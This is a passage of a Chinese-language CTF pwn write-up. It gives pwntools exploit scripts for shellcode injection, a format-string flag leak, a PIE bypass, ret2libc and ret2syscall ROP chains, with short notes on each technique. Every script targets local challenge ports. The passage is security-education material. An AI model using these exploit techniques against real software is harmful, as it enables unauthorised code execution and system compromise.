data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'localhost'</span><span class=\"token punctuation\">,</span><span class=\"token number\">34683</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./shellcode_level0')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sh<span class=\"token operator\">=</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>payload <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"shellcode_level1\"><a class=\"markdownIt-Anchor\" href=\"#shellcode_level1\">#</a> shellcode_level1</h2>\n<p>之前不知道设置 context，所以 64 位的 ret2shellcode 一直写不出</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'localhost'</span><span class=\"token punctuation\">,</span><span class=\"token number\">35885</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./shellcode_level1')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sh<span class=\"token operator\">=</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>payload <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'4'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"format_level0\"><a class=\"markdownIt-Anchor\" href=\"#format_level0\">#</a> format_level0</h2>\n<p>一眼 printf 漏洞，但是泄露 flag 后处理编码问题突然有点转不过来了。</p>\n<p>read 读入 flag 内容放入栈中，以 bytes 形式储存在栈中。设 str 为 % c% c 串应该可以直接输出，但可能因为函数调参只能 4 字节的调，所以每 4 字节漏 3 个。</p>\n<p>因此以 % x 链输出内存，然后 bytes 的格式打印出内存内容。需要先转换成 16 进制的数字，然后用 p32 函数再转回正常的 bytes 字节。</p>\n<p><img data-src=\"./image-20230820212525820.png\" alt=\"image-20230820212525820\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p= process('./format_level0')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'localhost'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">38269</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b printf')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#payload = b'aa%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c'</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'aa%x%x%x%x%x%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x'</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'is: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>lst <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">b'-'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>lst<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> lst<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token builtin\">str</span> <span class=\"token operator\">=</span> <span class=\"token string\">b''</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    tmp <span class=\"token operator\">=</span> p32<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token builtin\">str</span> <span class=\"token operator\">+=</span> tmp</pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"pie_enabled\"><a class=\"markdownIt-Anchor\" href=\"#pie_enabled\">#</a> PIE_enabled</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./PIE_enabled'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'localhost'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'43479'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'address is:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>ptr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>binsh<span class=\"token operator\">=</span><span class=\"token number\">0x4010</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sys<span class=\"token operator\">=</span><span class=\"token number\">0x11d8</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>rdi_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x1323</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>vuln <span class=\"token operator\">=</span> <span class=\"token number\">0x1245</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">cg</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    tmp <span class=\"token operator\">=</span> ptr <span class=\"token operator\">-</span> vuln</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">return</span> tmp<span class=\"token operator\">+</span>x</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x50</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>cg<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>cg<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>cg<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"ret2libc\"><a class=\"markdownIt-Anchor\" href=\"#ret2libc\">#</a> ret2libc</h2>\n<p>套模板，泄露地址后计算偏移</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'localhost'</span><span class=\"token punctuation\">,</span><span class=\"token number\">35995</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=process('./ret2libc')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,'b *0x0')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./ret2libc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>puts_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>puts_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x050</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>main_a <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>exit_a <span class=\"token operator\">=</span> main_a</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>prdi <span class=\"token operator\">=</span> <span class=\"token number\">0x040117e</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x040101a</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">ready</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'help u??\\n\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre>ready<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>payload <span class=\"token operator\">=</span> offset <span class=\"token operator\">*</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>prdi<span class=\"token punctuation\">)</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>lsm_g<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_p<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>main_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the true address of __libc_start_main is %#x'</span><span class=\"token operator\">%</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\">#'''</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>libc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>libc = ELF('./libc-2.23.so')</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>libcbase = lsm_a - libc.sym['__libc_start_main']</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>sys_a = libcbase + libc.sym['system']</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>bs_a = libcbase + next(libc.search(b'/bin/sh'))</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>ready<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>payload <span class=\"token operator\">=</span> offset <span class=\"token operator\">*</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>prdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>bs_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>exit_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"ret2syscall\"><a class=\"markdownIt-Anchor\" href=\"#ret2syscall\">#</a> ret2syscall</h2>\n<p>网上关于 ret2syscall 的资料非常少，大部分都是 32 位的，而且抄来抄去的。整理理解完，原理如下。</p>\n<p>系统调用其实就是当汇编指令为 int 0x80（32 位）或者 syscall（64 位）时，cpu 将中断运行，并执行系统调用号对应的函数。而系统调用号需事先储存在 eax 或 rax。</p>\n<p>32 位需将参数依次放入 ebx，ecx，edx。而 64 位与原先一致，即 rdi, rsi, rdx。</p>\n<p>未开启沙盒下，可以构造如下函数直接 getshell</p>\n<pre><code class=\"language-c++\">execve(&quot;/bin/sh&quot;,NULL,NULL);\t//字符串地址,0,0\n</code></pre>\n<p>可用如下指令查看 64 位程序中 syscall 的地址</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ROPgadget <span class=\"token parameter variable\">--binary</span> ret2syscall <span class=\"token parameter variable\">--only</span> <span class=\"token string\">'syscall'</span></pre></td></tr></table></figure><p><img data-src=\"./image-20230820214239260.png\" alt=\"image-20230820214239260\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'localhost'</span><span class=\"token punctuation\">,</span><span class=\"token number\">38659</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=process('./ret2syscall')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,'b *0x0')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>sc <span class=\"token operator\">=</span> <span class=\"token number\">0x0401185</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>binsh <span class=\"token operator\">=</span> <span class=\"token number\">0x0404040</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p_rax <span class=\"token operator\">=</span> <span class=\"token number\">0x040117e</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p_rdi <span class=\"token operator\">=</span> <span class=\"token number\">0x0401180</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p_rsi_rdx <span class=\"token operator\">=</span> <span class=\"token number\">0x0401182</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x040</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>payload <span class=\"token operator\">=</span> offset <span class=\"token operator\">*</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>p_rdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>p_rax<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x3b</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>p_rsi_rdx<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>sc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"shellcode_level2\"><a class=\"markdownIt-Anchor\" href=\"#shellcode_level2\">#</a> shellcode_level2</h2>\n<p>无法编译，直接看汇编。</p>\n<img data-src=\"./image-20230820214550469.png\" alt=\"image-20230820214550469\"  />\n<p>memset 会清空输入。</p>\n<p>jz short loc_1250 可以直接跳到执行 shellcode 的命令。而该指令在 ZF=0 时生效。</p>\n<p>test al, al 为对两数进行位与，结果为 0 时，ZF 为 0，否则为 1。al 来源于 rax 低 8 位，rax 来源于 s 字符串首位，因此将字符串首位设置为 0 即可跳过 menset。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3IxNTUzNzg5MTY5L2FydGljbGUvZGV0YWlscy8xMDk5NjU3MjY=\">test 用法</span></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'localhost'</span><span class=\"token punctuation\">,</span><span class=\"token number\">38393</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./shellcode_level1')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sh<span class=\"token operator\">=</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>payload <span class=\"token operator\">=</span> 